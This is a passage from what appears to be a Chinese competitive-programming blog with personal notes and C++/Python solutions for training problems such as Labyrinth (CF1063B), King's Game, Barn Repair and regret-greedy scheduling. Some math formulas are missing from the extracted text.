* cnt[b];            ans[b][2] += sum * cnt[a];        }    }    for(int i = 1; i &lt;= m; ++i){        printf(\"%d %d %d %d\\n\", ans[x[i]][1], ans[x[i]][2], ans[x[i]][3], ans[x[i]][4]);    }    return 0^(0-0)^0;}\n\n\n海港传送门\n对于第i艘船, 向前查找所有的船, 找到所有满足  的船并统计, 只能做到 .\n注意到  是递增的, 而我们只想要一段长为  的到达时间信息, 利用尺取法的思想, 用队列维护一个长为  的窗口, 每当有新船只到港时, 做出如下操作:\n\n把和新船只到达时间超过1天的船移除. (队首的船到港最早, 不断取队首判断就行了) 并删掉其国籍信息.\n把新船加入队列, 更新国籍信息.\n输出当前国籍数量.\n\n问题在于如何维护国籍信息.\n首先, 容易想到使用二维数组G[i][j]记录第i艘船第j个人的船籍, 但这需要开G[N][K]这么大的数组, 不可能.\n注意到 , 我的想法就是直接用一个一维数组x[i]表示全部的第i个人的船籍, 再用一个一维数组idx[i]表示第i艘船的第一个人在x中的位置, 这样, 第i艘船的所有人的船籍就是x[idx[i] ~ idx[i] + k[i] - 1].\n然后, 用bucket[i]表示船籍为i的船员数量, cnt表示当前窗口内的国籍数. \n当新船加入时, 遍历船上的国籍k, 并将bucket[k] + . 如果加之前bucket[k]为 , 说明是新国籍, 令cnt + .\n当旧船退出时, 利用idx[i]和x[i]来遍历该艘船上的国籍k, 并将bucket[k] - . 如果减之后bucket[k]为 , 说明已无该国人, 令cnt - .\n时间复杂度  . \n具体实现见代码:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 300005int n;int t[N], k[N];int idx[N], x[N];int bucket[N];std::queue&lt;int&gt; q;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}int main(){    n = read();    int pr = 1, cnt = 0;    for(int i = 1; i &lt;= n; ++i){        // 读入        q.push(i); // 入队        t[i] = read(); // 时间        k[i] = read(); // 人数        for(int j = pr; j &lt; pr + k[i]; ++j) x[j] = read(); // 国籍        // 出队        while(t[i] - t[q.front()] &gt;= 86400){            int prr = idx[q.front()];            for(int j = prr; j &lt; prr + k[q.front()]; ++j){                --bucket[x[j]];                if(!bucket[x[j]]) --cnt;            }            q.pop();        }        // 维护桶        for(int j = pr; j &lt; pr + k[i]; ++j){            if(!bucket[x[j]]) ++cnt;            ++bucket[x[j]];        }        // 更新下标        idx[i] = pr, pr += k[i];        // 输出数量        printf(\"%d\\n\", cnt);    }    return 0;}\n\n\n深さ優先探索传送门\n本来不写这道题的, 结果发现这题我有个❌, 有个三年半前Waiting的评测记录.\n强迫症, 忍不了, 就把DFS和BFS都写了一遍. 只挂代码, 懒得注释了.\n#include &lt;queue&gt;#include &lt;cstdio&gt;int n, m, sx, sy, ex, ey;char map[505][505];bool vis[505][505];int move1[4] = {0, 0, 1, -1};int move2[4] = {1, -1, 0, 0};bool valid(int x, int y){    return x &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; m &amp;&amp; map[x][y] != '#';}void dfs(int x, int y){    vis[x][y] = 1;    for(int i = 0; i &lt; 4; ++i){        int xx = x + move1[i], yy = y + move2[i];        if(valid(xx, yy) &amp;&amp; !vis[xx][yy]) dfs(xx, yy);    }}void bfs(int sx, int sy){    std::queue&lt;std::pair&lt;int, int&gt; &gt; q;    q.push({sx, sy});    while(q.size()){        int x = q.front().first, y = q.front().second;        q.pop();        for(int i = 0; i &lt; 4; ++i){            int xx = x + move1[i], yy = y + move2[i];            if(valid(xx, yy) &amp;&amp; !vis[xx][yy]){                vis[xx][yy] = 1;                q.push({xx, yy});            }        }    }}int main(){    scanf(\"%d%d\", &amp;n, &amp;m);    char ch = '\\n';    for(int i = 0; i &lt; n; ++i){        for(int j = 0; j &lt; m; ++j){            while(ch == '\\n') ch = getchar();            map[i][j] = ch; ch = getchar();            if(map[i][j] == 's') sx = i, sy = j;            if(map[i][j] == 'g') ex = i, ey = j;        }    }//    dfs(sx, sy);    bfs(sx, sy);    puts(vis[ex][ey]? \"Yes\" : \"No\");    return 0^(0-0)^0;}\n\n\n八皇后 Checker Challenge传送门\nDFS典题, 提供一份AC Code.\n#include &lt;bits/stdc++.h&gt;#define N 25int n, cnt;int ans[N];bool col[N], diag1[N], diag2[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}void print(){    for(int i = 1;i &lt;= n; ++i) printf(\"%d \", ans[i]);    putchar('\\n'); return;}bool check(int r, int c){    return col[c] or diag1[c + r - 1] or diag2[n - (c - r + 1)];}void dfs(int order){ // 第order行, 要放在哪一排    if(order &gt; n){        if(cnt &lt; 3) print();        ++cnt;        return;    }    for(int i = 1; i &lt;= n; ++i){        if(check(order, i)) continue;        col[i] = diag1[i + order - 1] = diag2[n - (i - order + 1)] = true;        ans[order] = i;        dfs(order + 1);        col[i] = diag1[i + order - 1] = diag2[n - (i - order + 1)] = false;    }}signed main(){    n = read();    dfs(1);    printf(\"%d\\n\", cnt);}\n\n\nLabyrinth [CF1063B]洛谷传送门\nCF传送门\n一开始我是这么想的:\n将每个点的坐标、剩余向左和向右的移动次数设为状态, 然后直接BFS:\nWA on test 40:\n// https://codeforces.com/contest/1063/problem/B// WA on test 40#include &lt;queue&gt;#include &lt;cstdio&gt;int n, m, r, c, X, Y;int ans;char map[2005][2005];bool vis[2005][2005];struct Status{    int x, y, l, r;};bool valid(int x, int y, int l, int r){    return x &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; m &amp;&amp; l &gt;= 0 &amp;&amp; r &gt;= 0 &amp;&amp; map[x][y] != '*';}void bfs(int x, int y){    std::queue&lt;Status&gt; q;    q.push({x, y, X, Y});    ++ans, vis[x][y] = 1;    while(q.size()){        Status cur = q.front(); q.pop();        // 左        if(valid(cur.x, cur.y - 1, cur.l - 1, cur.r) &amp;&amp; !vis[cur.x][cur.y - 1]){            ++ans, vis[cur.x][cur.y - 1] = 1;            q.push({cur.x, cur.y - 1, cur.l - 1, cur.r});        }        // 右        if(valid(cur.x, cur.y + 1, cur.l, cur.r - 1) &amp;&amp; !vis[cur.x][cur.y + 1]){            ++ans, vis[cur.x][cur.y + 1] = 1;            q.push({cur.x, cur.y + 1, cur.l, cur.r - 1});        }        // 上        if(valid(cur.x - 1, cur.y, cur.l, cur.r) &amp;&amp; !vis[cur.x - 1][cur.y]){            ++ans, vis[cur.x - 1][cur.y] = 1;            q.push({cur.x - 1, cur.y, cur.l, cur.r});        }        // 下        if(valid(cur.x + 1, cur.y, cur.l, cur.r) &amp;&amp; !vis[cur.x + 1][cur.y]){            ++ans, vis[cur.x + 1][cur.y] = 1;            q.push({cur.x + 1, cur.y, cur.l, cur.r});        }    }}int main(){    scanf(\"%d%d%d%d%d%d\", &amp;n, &amp;m, &amp;r, &amp;c, &amp;X, &amp;Y);    char ch = '\\n';    for(int i = 0; i &lt; n; ++i){        for(int j = 0; j &lt; m; ++j){            while(ch == '\\n') ch = getchar();            map[i][j] = ch; ch = getchar();        }    }    bfs(r - 1, c - 1); // 记得-1, 因为我这里的map是从(0,0)开始.    printf(\"%d\\n\", ans);    return 0;}\n\n于是, 我开始思考为什么这样会WA.\n很快我就发现, 仅根据一个点是否被访问过来去除更晚才到达该点的状态是不合理的, 因为有些状态虽然更晚到达该点, 但由于路径的不同, 它可能有更多的剩余向左/向右走的次数, 能走的更远!\n那怎么办呢?\n我的做法是这样: 想办法让被先访问过的点是更优的, 即剩余向左/向右走的次数更多.也就是说, 我们每次都优先拓展 向上/向下 移动的状态, 而最后再拓展 向左/向右 移动的状态, 这样就能保证先被访问的点有着最多的剩余左右移动次数.\n实现也很简单, 把队列改成双端队列, 每次拓展的时候, 把向上/向下 移动的状态放到队首, 而向左/向右 移动的状态放到队尾, 取队首来拓展即可.\n// https://codeforces.com/contest/1063/problem/B// Accepted#include &lt;queue&gt;#include &lt;cstdio&gt;int n, m, r, c, X, Y;int ans;char map[2005][2005];bool vis[2005][2005];struct Status{    int x, y, l, r;};bool valid(int x, int y, int l, int r){    return x &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; m &amp;&amp; l &gt;= 0 &amp;&amp; r &gt;= 0 &amp;&amp; map[x][y] != '*';}void bfs(int x, int y){    std::deque&lt;Status&gt; q;    q.push_front({x, y, X, Y});    ++ans, vis[x][y] = 1;    while(q.size()){        Status cur = q.front(); q.pop_front();        // 左        if(valid(cur.x, cur.y - 1, cur.l - 1, cur.r) &amp;&amp; !vis[cur.x][cur.y - 1]){            ++ans, vis[cur.x][cur.y - 1] = 1;            q.push_back({cur.x, cur.y - 1, cur.l - 1, cur.r});        }        // 右        if(valid(cur.x, cur.y + 1, cur.l, cur.r - 1) &amp;&amp; !vis[cur.x][cur.y + 1]){            ++ans, vis[cur.x][cur.y + 1] = 1;            q.push_back({cur.x, cur.y + 1, cur.l, cur.r - 1});        }        // 上        if(valid(cur.x - 1, cur.y, cur.l, cur.r) &amp;&amp; !vis[cur.x - 1][cur.y]){            ++ans, vis[cur.x - 1][cur.y] = 1;            q.push_front({cur.x - 1, cur.y, cur.l, cur.r});        }        // 下        if(valid(cur.x + 1, cur.y, cur.l, cur.r) &amp;&amp; !vis[cur.x + 1][cur.y]){            ++ans, vis[cur.x + 1][cur.y] = 1;            q.push_front({cur.x + 1, cur.y, cur.l, cur.r});        }    }}int main(){    scanf(\"%d%d%d%d%d%d\", &amp;n, &amp;m, &amp;r, &amp;c, &amp;X, &amp;Y);    char ch = '\\n';    for(int i = 0; i &lt; n; ++i){        for(int j = 0; j &lt; m; ++j){            while(ch == '\\n') ch = getchar();            map[i][j] = ch; ch = getchar();        }    }    bfs(r - 1, c - 1); // 记得-1, 因为我这里的map是从(0,0)开始.    printf(\"%d\\n\", ans);    return 0;}\n\n\n[蓝桥杯 2023 省 A] 买瓜传送门\n看了这题, 第一想法就是爆搜, 并尝试写了一下代码.\n为了避免除法, 我的做法是, 把  乘以  , 用 a[i] 表示半个瓜重, a[i] &lt;&lt; 1表示整个瓜重, 相当于全都乘以  来与除法相抵消.\n当然也可以讨论  的奇偶性, 但那样写起来非常繁琐.\n然后把能想到的剪枝都写上:\n\n当前劈瓜数 &gt; 答案, 剪!\n把瓜按重量从小到大排序, 如果劈当前瓜, 总重就比  大了, 那选后面的瓜肯定也比  大, 剪！\n预处理瓜重后缀和. sub[i] 表示第  到  个瓜的重量和. 显然, 如果把  及其后面所有瓜都选上, 总重仍小于  , 就没必要再搜了, 剪!\n\n时间复杂度  , 喜提  pts.\n32分代码:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;algorithm&gt;int n, m, ans = 114514191;int a[35];long long sub[35];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(;  isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}void dfs(int i, long long sum, int cnt){    /* Args:        i: 当前要决策的瓜的下标        sum: 已经选取的瓜的总重        cnt: 劈过的瓜的数量    *///    printf(\"%d %lld %d %d\\n\", i, sum, cnt, flag);    // 注意, 可能 i&lt;n 但 sum 已经等于 m ! 我在这里WA了好几次    if(i &gt; n || sum == m){        if(sum == m) ans = min(ans, cnt);        return;    }    if(cnt &gt;= ans) return;    if(sum + a[i] &gt; m) return;    if(sum + sub[i] &lt; m) return;    if(sum + (a[i] &lt;&lt; 1) &lt;= m) dfs(i+1, sum + (a[i] &lt;&lt; 1), cnt);    dfs(i+1, sum + a[i], cnt+1);    dfs(i+1, sum, cnt); // 不选}signed main(){    n = read(); m = read() &lt;&lt; 1;    for(int i = 1; i &lt;= n; ++i) a[i] = read();    std::stable_sort(&amp;a[1], &amp;a[n+1]);    for(int i = n; i &gt;= 1; --i) sub[i] = sub[i+1] + (a[i] &lt;&lt; 1); // 后缀和    if(sub[1] &lt; m){puts(\"-1\"); return 0;}    dfs(1, 0, 0);    printf(\"%d\\n\", ans != 114514191? ans : -1);    return 0;}\n\n但我不死心, 想再挣扎一下, 找找玄学优化方法.\n很快就想到了, 原来是按瓜重从小到大选, 总重  逼近  的速度非常慢. 如果按瓜重从大到小选,  逼近  的速度就会快很多.\n稍作修改, 再次提交, 没想到这代码跑的飞快,  就过了, 吊打标答折半搜索…\n果然暴力出奇迹.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;algorithm&gt;int n, m, ans = 114514191;int a[35];long long sub[35];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(;  isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}bool cmp(int a, int b){return a &gt; b;}int min(int a, int b){return a &lt; b? a : b;}void dfs(int i, long long sum, int cnt){    /* Args:        i: 当前要决策的瓜的下标        sum: 已经选取的瓜的总重        cnt: 劈过的瓜的数量    *///    printf(\"%d %lld %d %d\\n\", i, sum, cnt, flag);    // 注意, 可能 i&lt;n 但 sum 已经等于 m ! 我在这里WA了好几次    if(i &gt; n || sum == m){        if(sum == m) ans = min(ans, cnt);        return;    }    if(cnt &gt;= ans) return;    if(sum + sub[i] &lt; m) return;    if(sum + (a[i] &lt;&lt; 1) &lt;= m) dfs(i+1, sum + (a[i] &lt;&lt; 1), cnt);    if(sum + a[i] &lt;= m) dfs(i+1, sum + a[i], cnt+1);    dfs(i+1, sum, cnt); // 不选}signed main(){    n = read(); m = read() &lt;&lt; 1;    for(int i = 1; i &lt;= n; ++i) a[i] = read();    std::stable_sort(&amp;a[1], &amp;a[n+1], cmp); // 优先选重量大的, 更快逼近答案    for(int i = n; i &gt;= 1; --i) sub[i] = sub[i+1] + (a[i] &lt;&lt; 1); // 后缀和    if(sub[1] &lt; m){puts(\"-1\"); return 0;}    dfs(1, 0, 0);    printf(\"%d\\n\", ans != 114514191? ans : -1);    return 0;}\n\n\n训练题D - Anji’s Binary Tree洛谷传送门\nCF传送门\n我用DFS做的.\ndfs(int u, int step): u表示当前结点, step表示修改次数.\n\n如果u没有左右儿子, 结束递归, 用step更新答案.\n如果u有左儿子, 就dfs(Lson[u], step + (s[u] != 'L'))\n如果u有右儿子, 就dfs(Rson[u], step + (s[u] != 'R'))\n\n这要把整颗树都搜一遍, 跑起来应该比BFS慢. 但反正时间复杂度都是  , 能轻松通过本题就行.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 300005int T, n, ans;char s[N];int Lson[N];int Rson[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}int min(int a, int b){return a &lt; b? a : b;}void dfs(int u, int step){    if(Lson[u] == 0 &amp;&amp; Rson[u] == 0){        ans = min(ans, step);        return;    }    if(Lson[u]){        if(s[u] == 'L') dfs(Lson[u], step);        else dfs(Lson[u], step + 1);    }    if(Rson[u]){        if(s[u] == 'R') dfs(Rson[u], step);        else dfs(Rson[u], step + 1);    }}void solve(){    n = read();    scanf(\"%s\", s + 1);    for(int i = 1; i &lt;= n; ++i) Lson[i] = read(), Rson[i] = read();    ans = 114514191;    dfs(1, 0);    printf(\"%d\\n\", ans);}int main(){    T = read();    while(T--) solve();    return 0^(0-0)^0;}\n\n\nE - Grid and Magnet洛谷传送门\n一开始以为是遍历整张图, 求最大连通块的大小, 写上去喜提WA  36.0 / 52.0.\n这是WA了的代码:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 1005int n, m, ans = 1, cnt;char map[N][N];bool vis[N][N];int move1[4] = {0, 0, 1, -1};int move2[4] = {1, -1, 0, 0};int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}inline int max(int a, int b){return a &gt; b? a : b;}bool valid(int x, int y){    // 判断(x, y)是否在地图内且上下左右没有磁铁.    return x &gt; 0 &amp;&amp; x &lt;= n &amp;&amp; y &gt; 0 &amp;&amp; y &lt;= m &amp;&amp;           map[x-1][y] != '#' &amp;&amp; map[x+1][y] != '#' &amp;&amp;           map[x][y-1] != '#' &amp;&amp; map[x][y+1] != '#';}void dfs(int x, int y){    ++cnt;//    printf(\"(%d, %d)\\n\", x, y);    for(int i = 0; i &lt; 4; ++i){        int xx = x + move1[i], yy = y + move2[i];        if(xx &lt; 1 || xx &gt; n || yy &lt; 1 || yy &gt; m) continue;        if(valid(x, y) &amp;&amp; !vis[xx][yy]){            vis[xx][yy] = 1;            dfs(xx, yy);        }    }}int main(){    n = read(), m = read(); char ch = '\\n';    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            while(ch == '\\n') ch = getchar();            map[i][j] = ch; ch = getchar();        }    }    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            if(!vis[i][j] &amp;&amp; map[i][j] == '.' &amp;&amp; valid(i, j)){                cnt = 0, vis[i][j] = 1;                dfs(i, j);            //    printf(\"cnt: %d\\n\", cnt);                ans = max(ans, cnt);            }        }    }    printf(\"%d\\n\", ans);    return 0;}\n\n稍加分析一下就知道不对了.\n比如, 先从A点开始扫描, A点最远能走到B点, 也就是B的周围有磁铁, 这个过程已经把B视为和A连通的块了, 且B也被标记为已访问.\n那么, 下次从C点开始扫描时, 可能C点最远也能走到B点. 但由于B点已经被标记为已访问, 它不会被计入C可以到访的点中.\n那要怎么修呢?\n有个很暴力的做法, 就是以所有点为起点进行扫描 (每次扫描前都重置vis数组), 统计从每个点出发能到达的点的数量. 时间复杂度  . 大概率通过不了.\n但实际上, 我们不需要把所有点都当起点跑DFS, 如果一个点已经被访问过了, 有两种情况:\n\n这个点周围没有磁铁, 那么它所能走过的点就是它所属的连通块. 这个之前已经求解过了.\n这个点周围有磁铁. 那么它肯定只能作为终点存在.\n\n也就是说, 我们只需要以未被访问过的点为起点来DFS, 且遍历过程中可以访问 以其它点为起点 所到访过 的点. 这样就没问题了.\n时间复杂度应该也是  . 实际上, 此题和普通的找连通块题的区别在于块与块之间可以共享边界.\n感觉我赛时的代码实现不是很好, 当时给它当成染色来做了. 但无所谓, 能AC就行.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 1005int n, m, ans = 1, cnt, num;char map[N][N];int vis[N][N];int move1[4] = {0, 0, 1, -1};int move2[4] = {1, -1, 0, 0};int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}inline int max(int a, int b){return a &gt; b? a : b;}bool valid(int x, int y){    // 判断(x, y)是否在地图内且上下左右没有磁铁.    return x &gt; 0 &amp;&amp; x &lt;= n &amp;&amp; y &gt; 0 &amp;&amp; y &lt;= m &amp;&amp;           map[x-1][y] != '#' &amp;&amp; map[x+1][y] != '#' &amp;&amp;           map[x][y-1] != '#' &amp;&amp; map[x][y+1] != '#';}void dfs(int x, int y){    ++cnt;    vis[x][y] = num;    if(!valid(x, y)) return;    for(int i = 0; i &lt; 4; ++i){        int xx = x + move1[i], yy = y + move2[i];        if(xx &lt; 1 || xx &gt; n || yy &lt; 1 || yy &gt; m) continue;        if(vis[xx][yy] != vis[x][y]) dfs(xx, yy);    }}int main(){    n = read(), m = read(); char ch = '\\n';    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            while(ch == '\\n') ch = getchar();            map[i][j] = ch; ch = getchar();        }    }    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            if(!vis[i][j] &amp;&amp; map[i][j] == '.'){                cnt = 0, vis[i][j] = ++num;                dfs(i, j);            //    printf(\"cnt: %d\\n\", cnt);                ans = max(ans, cnt);            }        }    }    printf(\"%d\\n\", ans);    return 0;}\n\n\nF - Mah-jongQOJ传送门\n咕咕咕…\n","categories":["算法"],"tags":["模拟","搜索"]},{"title":"XCPC 寒假集训班 D3 个人笔记","url":"/2025/01/16/XCPC-%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD%E7%8F%AD-D3-%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/","content":"讲评题砍树传送门\n二分答案即可.\n#include &lt;bits/stdc++.h&gt;#define N 1000006#define int long longint n, m;int a[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}bool valid(int h){    int res = 0;    for(int i = 1; i &lt;= n; ++i) if(a[i] &gt;= h) res += a[i] - h;    return res &gt;= m;}int binary_search(int l, int r){    while(l &lt; r){        int mid = (l + r + 1) &gt;&gt; 1;        if(valid(mid)) l = mid;        else r = mid - 1;    }    return l;}signed main(){    n = read(), m = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    printf(\"%lld\\n\", binary_search(1, 1e15));    return 0;}\n\n\n三分传送门\n#include &lt;bits/stdc++.h&gt;#define int long long#define eps 1e-6int n;double l, r;double a[15];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}double calc(double x){    double res = 0;    for(int i = 0; i &lt;= n; ++i) res += a[i] * pow(x, i);    return res;}signed main(){    n = read(); scanf(\"%lf %lf\", &amp;l, &amp;r);    for(int i = n; ~i; --i) scanf(\"%lf\", &amp;a[i]);    while(r - l &gt; eps){        double lmid = l + (r - l) / 3.0, rmid = l + (r - l) * 2.0 / 3.0;        double lval = calc(lmid), rval = calc(rmid);        if(rval &gt; lval) l = lmid;        else r = rmid;    }    printf(\"%.5lf\\n\", l);    return 0;}\n\n\n国王游戏 (邻项交换)传送门\n先猜测结论: 按  升序排序, 就是最优排队方案.\n\n  \n    \n      可使用微扰(邻项交换)证明该结论:\n\n    \n    \n      假设我们交换相邻的两个大臣  与  , 依题意, 在交换前, 他们获得的奖励分别是:\n与\n交换后, 他们获得的奖励分别是:\n与\n显然, 交换后, 其它的大臣获得的奖励不变.\n故我们只需要比较这  组式子最大值的大小.\n把公因式  扔掉, 也就是要比较\n与\n同时乘以 , 也就是要比较\n与\n显然  , , 所以最终就是比较:\n与\n而 , 即交换前更优.\n\n    \n  \n\n然而, 只知道结论没用. 看数据范围, 这题需要高精度.\n贴一份 Python 3 AC Code:\nn = int(input())X, Y = map(int, input().split())a = []for i in range(n):    x0, x1 = map(int, input().split())    a.append((x0, x1))a.sort(key = lambda x: x[0] * x[1])res, ans = X, 0for i in a:    if ans == 0: ans = res // i[1]    if res // i[1] &gt; ans: ans = res // i[1]    res = res * i[0]print(ans)\n\n\n修理牛棚 Barn Repair (边界推进)传送门\n一开始理解错题意了, 以为购置的木板长度必须相同, 那样就需要二分木板长度.\n跑不出样例, 多读了好几遍题面才恍然大悟.\n那就很简单了, 先假设有一块大木板刚好把所有牛棚拦住, 接着我们把没有牛的片段扔掉, 扔 段, 就剩下  段木板了.\n既然要最小化木板总长度, 那就需要最大化扔掉的片段的长度. 所以就贪心地按牛棚间距从大到小排序, 扔掉前 段即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;algorithm&gt;int m, s, c;int a[205];int d[205];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    m = read(), s = read(), c = read();    for(int i = 1; i &lt;= c; ++i) a[i] = read();    std::stable_sort(&amp;a[1], &amp;a[c+1]); // 把牛棚编号从小到大排序    d[1] = 0; // 第一个牛棚和边界的间距为0    for(int i = 2; i &lt;= c; ++i) d[i] = a[i] - a[i-1] - 1; // 计算相邻牛棚的间距长度, 注意要-1    std::stable_sort(&amp;d[1], &amp;d[c+1]); // 把间距从小到大排序, 后面逆序遍历取前m-1大值即可.        long long ans = a[c] - a[1] + 1; // 一开始的大木板长度, 要刚刚好覆盖所有的牛棚    for(int i = c, j = 1; i &gt;= 1 and j &lt; m; --i, ++j) ans -= d[i]; // 扔掉间距    printf(\"%lld\\n\", ans);    return 0^(0-0)^0;}\n\n\nWork Scheduling G (反悔贪心)传送门\n反悔贪心看这里\n很容易想到这样的贪心策略: 按截止时间从小到大遍历, 每次都把能做的任务做了.\n如果遇到不能做的任务  怎么办? 那就比较一下  的利润和之前做的利润最低的任务 .\n\n如果  的利润不高于  , 那还做  干啥? 直接放弃  .\n如果  的利润高于  , 那就反悔了, 丢芝麻捡西瓜, 用  去替换  .\n\n怎么找  ? 用堆就可以. 拿一个小根堆(按利润)维护已做任务即可.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;algorithm&gt;#define N 100005int n;struct Task{    int d, p;    bool operator &lt; (const Task&amp; b) const{        return p &gt; b.p; // 重载运算符, 让堆把价值小的放在堆顶.    }}a[N], top[N];bool cmp(Task a, Task b){    return a.d == b.d ? a.p &gt; b.p : a.d &lt; b.d; // 自定义的sort比较函数}std::priority_queue&lt;Task&gt; q;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i].d = read(), a[i].p = read();    std::stable_sort(&amp;a[1], &amp;a[n+1], cmp); // 按截止时间从小到大排序    long long ans = 0;    for(int i = 1; i &lt;= n; ++i){        if(a[i].d == q.size()){ // 思考一下为什么可以这样判断任务是否矛盾            long long tmp = q.top().p; // 取出堆顶, 也就是利润最低的任务            if(a[i].p &gt; tmp){ // 如果新任务利润更大, 就替换(反悔)                ans += a[i].p - tmp;                q.pop();                q.push(a[i]);            }        }        else{            ans += a[i].p; // 不矛盾就先做了.            q.push(a[i]);        }    }    printf(\"%lld\\n\", ans);    return 0^(0-0)^0;}\n\n训练题B - Brightness Begins洛谷传送门\nCF传送门\n易知, \n\n如果一个数有奇数个因子, 它会被翻转奇数次, 对应的灯泡最终关闭.\n如果一个数有偶数个因子, 它会被翻转偶数次, 对应的灯泡最终打开.\n\n哎? 因子不都是一对一对的吗? 怎样才能出现奇数个因子?\n那就是其中一对因子, 两个因子相同. 也就是说这个数是完全平方数.\n有 盏灯中有  盏灯最终打开, 也就是  到  中有  个非完全平方数. 那完全平方数的数量就是  .\n而由数学知识,  到  中有  个完全平方数. (这个就不需要证明了吧…  =  的解的个数就是  .)\n于是就有如下方程:\n\n二分这个  即可.\n但我们能不能直接瞪出  呢? 还真可以.\n\n  \n    \n      求解n\n\n    \n    \n      设  , 则有  .\n把取整符号拿掉:\n\n把根号干掉:\n\n得到方程组:\n\n直接求根公式:\n\n合并一下得:\n\n再化简一下:\n\n又因为 , 这里已经能直接瞪出:\n\n故  .\n\n    \n  \n\n这题要注意 sqrt或sqrtl函数的精度问题, 保险起见最好自己再写个函数二分  .\n我赛时没去推  做法, 用的  二分找  的解. 代码应该不需要贴了吧 (代码太丑陋).\n\nC - Mandarin Orange传送门\n 最大只有  , 直接  暴力是可以通过的.\n赛时AC Code (  ):\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;int n, ans;int a[10005];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}int min(int a, int b){return a &lt; b? a : b;}int max(int a, int b){return a &gt; b? a : b;}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read();    for(int i = 1; i &lt;= n; ++i){        int x = a[i];        for(int j = i; j &lt;= n; ++j){            x = min(x, a[j]);            ans = max(ans, x * (j - i + 1));        }    }    printf(\"%d\\n\", ans);    return 0;}\n\n但, 其实这题就是一个单调栈: 单调栈用于维护 每个数 前/后 第一个 大于/小于 它的数. 单调栈模板题在这里, 我在另一篇文章里详细介绍了单调栈. 利用单调栈我们就可以  解决这道题.\n做法如下: 从  到 枚举每个盘子, 并假设他要吃的橘子数  就是这个盘子中的橘子数.\n然后, 我们从这个盘子开始, 向左向右分别找出第一个橘子数比  小的盘子的坐标  ,  , 那么对于这个盘子, 他最多能吃到  个橘子.\n找  和  可以用两个单调栈来完成.\n这样就能做到  了.\n有空再提供一份代码.\n\nD - Freefall传送门\n题目就是要求出  的最小值.\n显然这是一个单峰函数, 找这个极值点就可以了.\n可以直接套三分板子, 但我还是用二分过的…\n把函数图像看成一个“坡”, 只要  , 就说明是在“下坡”, 